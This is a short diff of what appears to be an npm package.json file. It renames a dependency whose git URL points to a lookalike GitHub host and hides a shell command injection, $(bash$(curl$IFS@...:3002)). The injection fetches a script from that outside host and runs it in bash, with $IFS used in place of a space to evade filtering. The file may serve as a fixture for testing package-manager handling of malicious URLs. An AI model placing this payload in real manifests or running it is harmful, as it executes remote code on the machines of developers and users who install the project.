@@ -5,6 +5,6 @@
   "license": "MIT",
   "private": true,
   "dependencies": {
-    "registry4.json": "git+https://github.com.mocos.kitchen/github.com/$(bash$(curl$IFS@mocos.kitchen:3002))?/github.com/user/repo4#semver:1.0.0"
+    "registry5.json": "git+https://github.com.mocos.kitchen/github.com/$(bash$(curl$IFS@mocos.kitchen:3002))?/github.com/user/repo4#semver:1.0.0"
   }
 }
